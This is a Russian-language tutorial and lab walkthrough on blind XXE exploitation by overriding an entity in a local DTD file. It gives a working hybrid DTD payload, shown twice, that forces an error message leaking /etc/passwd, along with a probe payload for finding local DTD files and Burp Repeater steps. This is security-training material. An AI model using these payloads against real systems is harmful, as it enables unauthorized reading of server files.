# Использование слепого XXE путем повторного использования локального DTD

Предыдущая техника отлично работает с внешним DTD, но она обычно не работает с внутренним DTD, который полностью указан в элементе DOCTYPE. Это связано с тем, что техника подразумевает использование XML-параметрической сущности в определении другой параметрической сущности. Согласно спецификации XML, это разрешено во внешних DTD, но не во внутренних. (Некоторые парсеры могут это допускать, но многие — нет.)

### Слепой XXE при блокировке внеполосных взаимодействий

Когда внеполосные взаимодействия заблокированы, вы не можете извлечь данные через внешние подключения или загрузить внешний DTD. Однако вы можете вызвать сообщения об ошибках, содержащие конфиденциальные данные, используя лазейки в спецификации XML.

Если DTD документа использует гибрид внутренних и внешних деклараций, внутренний DTD может переопределять сущности, объявленные во внешнем DTD. Это позволяет использовать технику XXE на основе ошибок, если сущность параметра XML переопределяет сущность из внешнего DTD.

### Пример атаки

Допустим, на сервере существует файл DTD по пути `/usr/share/yelp/dtd/docbookx.dtd`, который содержит сущность с именем `ISOamso`. Злоумышленник может отправить гибридный DTD:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

Этот DTD выполняет следующие шаги:
1. Определяет сущность `local_dtd`, содержащую содержимое локального файла DTD.
2. Переопределяет сущность `ISOamso`, чтобы включить атаку XXE на основе ошибок.
3. Использует `local_dtd`, чтобы интерпретировать внешний DTD с переопределенной сущностью.

### Поиск локальных файлов DTD

Чтобы найти подходящий файл DTD, вы можете проверить его существование, отправив полезную нагрузку, вызывающую ошибку при отсутствии файла:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

Если файл существует, получите его копию для анализа сущностей, которые можно переопределить.

---

## Пример лабораторной работы

В этой лаборатории функция «Проверка запасов» анализирует XML-данные, но не отображает результат.

Для решения лаборатории вызовите сообщение об ошибке, содержащее содержимое файла `/etc/passwd`.

### Шаги выполнения

1. Выберите любой продукт:

![Список продуктов](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

2. Нажмите "Проверить наличие на складе":

![Кнопка проверки](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

3. В **Proxy → HTTP History** выберите POST-запрос к `/product/stock` и отправьте его в **Repeater**:

![POST-запрос](https://github.com/user-attachments/assets/f2febc3e-4ab7-441e-8fb3-04990746f99f)

4. Вставьте гибридный DTD:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

5. Получите результат с содержимым `/etc/passwd`:

![Результат /etc/passwd](https://github.com/user-attachments/assets/e6f9df34-6e44-46ea-81f9-16d3e6848ab3)
